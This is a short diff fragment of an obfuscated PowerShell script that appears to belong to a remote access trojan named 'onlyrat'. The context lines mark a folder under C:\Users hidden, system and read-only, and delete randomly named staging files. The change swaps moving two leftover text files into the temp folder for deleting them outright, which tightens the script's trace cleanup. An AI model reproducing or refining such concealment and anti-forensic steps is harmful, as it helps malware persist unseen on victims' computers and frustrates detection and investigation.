@@ -51,6 +51,6 @@ Set-Location C:\Users
 attrib +h +s +r onlyrat 
 Set-Location $NyZnoLKCIs
 Remove-Item $CRYnrkaDbe
-Move-Item XbrMzmCUiE.txt $env:temp
-Move-Item UJbMLjTIDr.txt $env:temp
+Remove-Item XbrMzmCUiE.txt
+Remove-Item UJbMLjTIDr.txt
 Remove-Item KFPGaEYdcz.ps1
